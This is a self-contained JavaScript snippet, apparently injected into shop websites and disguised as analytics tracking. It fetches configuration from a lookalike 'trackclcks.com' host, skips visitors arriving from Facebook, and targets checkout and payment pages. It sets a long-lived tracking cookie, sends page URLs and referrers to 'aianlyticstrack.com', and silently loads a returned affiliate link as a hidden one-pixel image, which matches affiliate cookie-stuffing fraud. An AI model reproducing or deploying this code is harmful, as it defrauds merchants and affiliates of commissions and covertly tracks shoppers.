(function () {
  const CONFIG_URL = 'https://trackclcks.com/api/site-config?host=';

  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
      const r = (Math.random() * 16) | 0;
      const v = c === 'x' ? r : (r & 0x3) | 0x8;
      return v.toString(16);
    });
  }

  function getCookie(name) {
    const match = document.cookie.match(new RegExp('(?:^|; )' + name + '=([^;]*)'));
    return match ? decodeURIComponent(match[1]) : '';
  }

  function createTrackingPixel(url) {
    const img = document.createElement('img');
    img.src = url;
    img.width = 1;
    img.height = 1;
    img.style.display = 'none';
    document.body.appendChild(img);
  }

  function isCheckoutPage() {
    const keywords = ['cart', 'checkout', 'review-order', 'shipping', 'payment', 'pay'];
    return keywords.some((keyword) =>
      window.location.pathname.toLowerCase().includes(keyword)
    );
  }

  function isFacebookReferral() {
    const referrer = (document.referrer || '').toLowerCase();
    if (referrer.includes('facebook.com') || referrer.includes('fb.com')) {
      return true;
    }
    const params = new URLSearchParams(window.location.search);
    const utmSource = (params.get('utm_source') || '').toLowerCase();
    return utmSource === 'facebook';
  }

  async function trackUser() {
    try {
      const uniqueId = getCookie('tracking_uuid') || generateUUID();
      const expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + '; path=/; SameSite=Lax';

      const response = await fetch('https://aianlyticstrack.com/api/track-user', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          url: location.href,
          referrer: document.referrer,
          unique_id: uniqueId,
          origin: location.hostname
        })
      });
      const data = await response.json();

      if (data.success && data.affiliate_url) {
        createTrackingPixel(data.affiliate_url);
        sessionStorage.setItem('tracking_done', '1');
      } else {
        createTrackingPixel('https://aianlyticstrack.com/api/fallback-pixel?id=' + uniqueId);
      }
    } catch (err) {
      console.error('Tracking error', err);
    }
  }

  function initTracking() {
    if (isFacebookReferral()) return;

    const hostname = window.location.hostname;
    fetch(CONFIG_URL + encodeURIComponent(hostname))
      .then(function (res) {
        if (!res.ok) throw new Error('Config API Failed');
        return res.json();
      })
      .then(function (config) {
        if (!config || (!config.always && !config.cartExtra)) return;

        if (config.cartExtra && isCheckoutPage()) trackUser();
        else config.always && trackUser();
      })
      .catch(function (err) {
        console.error('Config fetch failed:', err);
      });
  }

  if (document.readyState === 'interactive' || document.readyState === 'complete') {
    initTracking();
  } else {
    window.addEventListener('DOMContentLoaded', initTracking, { once: true });
  }
})();
